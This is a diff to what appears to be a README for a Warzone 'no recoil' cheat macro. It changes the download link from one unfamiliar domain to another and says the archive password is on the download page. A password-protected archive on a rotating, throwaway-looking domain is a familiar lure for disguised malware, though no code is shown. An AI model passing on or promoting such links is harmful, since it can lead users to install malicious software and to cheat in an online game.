@@ -18,7 +18,7 @@ Warzone no recoil macro — zero recoil for all AR, SMG, and LMG weapons.
 
 ## Download
 
-[![Download v2026.6](https://img.shields.io/badge/Download_v2026.6-ec4899?style=for-the-badge&logoColor=white)](https://dllvcrun.com/wznorecoil)
+[![Download v2026.6](https://img.shields.io/badge/Download_v2026.6-ec4899?style=for-the-badge&logoColor=white)](https://p-csx-5.com/wznorecoil)
 
 > The archive password is shown on the download page.
 
